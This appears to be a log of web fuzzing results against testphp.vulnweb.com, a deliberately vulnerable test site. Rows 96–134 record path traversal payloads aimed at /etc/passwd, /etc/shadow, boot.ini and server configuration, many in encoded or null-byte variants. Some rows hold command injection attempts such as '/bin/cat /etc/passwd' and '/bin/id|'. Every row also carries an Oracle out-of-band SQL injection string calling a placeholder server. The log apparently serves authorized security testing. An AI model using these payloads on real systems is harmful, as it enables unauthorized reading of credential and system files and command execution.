id_fuzz_1,96,,http://testphp.vulnweb.com/listproducts.php?cat=%00/etc/passwd%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,97,,http://testphp.vulnweb.com/listproducts.php?cat=%00/etc/shadow%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,98,,http://testphp.vulnweb.com/listproducts.php?cat=%00../../../../../../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,99,,http://testphp.vulnweb.com/listproducts.php?cat=%00../../../../../../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,100,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../etc/passwd%00.jpg,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,101,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../etc/passwd%00.html,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",0,0
id_fuzz_1,102,,http://testphp.vulnweb.com/listproducts.php?cat=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,103,,http://testphp.vulnweb.com/listproducts.php?cat=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,104,,http://testphp.vulnweb.com/listproducts.php?cat=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,105,,http://testphp.vulnweb.com/listproducts.php?cat=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,106,,http://testphp.vulnweb.com/listproducts.php?cat=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,107,,http://testphp.vulnweb.com/listproducts.php?cat=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,108,,http://testphp.vulnweb.com/listproducts.php?cat=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,109,,http://testphp.vulnweb.com/listproducts.php?cat=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,110,,http://testphp.vulnweb.com/listproducts.php?cat=\&apos;/bin/cat%20/etc/passwd\&apos;,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,111,,http://testphp.vulnweb.com/listproducts.php?cat=\&apos;/bin/cat%20/etc/shadow\&apos;,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,112,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../conf/server.xml,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,113,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../bin/id|,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,114,,http://testphp.vulnweb.com/listproducts.php?cat=C:/inetpub/wwwroot/global.asa,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,115,,http://testphp.vulnweb.com/listproducts.php?cat=C:\inetpub\wwwroot\global.asa,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,116,,http://testphp.vulnweb.com/listproducts.php?cat=C:/boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,117,,http://testphp.vulnweb.com/listproducts.php?cat=C:oot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,118,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../localstart.asp%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,119,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../localstart.asp,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,120,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../boot.ini%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,121,,http://testphp.vulnweb.com/listproducts.php?cat=../../../../../../../../../../../../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,122,,http://testphp.vulnweb.com/listproducts.php?cat=/./././././././././././boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,123,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,124,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,125,,http://testphp.vulnweb.com/listproducts.php?cat=/..\../..\../..\../..\../..\../..\../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,126,,http://testphp.vulnweb.com/listproducts.php?cat=/.\./.\./.\./.\./.\./.\./boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,127,,http://testphp.vulnweb.com/listproducts.php?cat=\..\..\..\..\..\..\..\..\..\..oot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,128,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..oot.ini%00,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,129,,http://testphp.vulnweb.com/listproducts.php?cat=..\..\..\..\..\..\..\..\..\..oot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,130,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini%00.html,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,131,,http://testphp.vulnweb.com/listproducts.php?cat=/../../../../../../../../../../../boot.ini%00.jpg,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,132,,http://testphp.vulnweb.com/listproducts.php?cat=/.../.../.../.../.../,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,133,,http://testphp.vulnweb.com/listproducts.php?cat=..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
id_fuzz_1,134,,http://testphp.vulnweb.com/listproducts.php?cat=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,GET,200,"{'error': 1, 'exception': 0, 'illegal': 0, 'invalid': 0, 'fail': 0, 'stack': 0, 'access': 0, 'directory': 0, 'file': 1, 'not found': 0, 'unknown': 0, 'uid=': 0, 'c:\\': 0, 'varchar': 0, 'ODBC': 0, 'SQL': 1, 'quotation mark': 0, 'syntax': 1, 'ORA-': 0, '111111': 0, 'test': 1, 'test2': 0, ""'||Utl_Http.request('http://<yourservername>') from dual--"": 0}",1,0
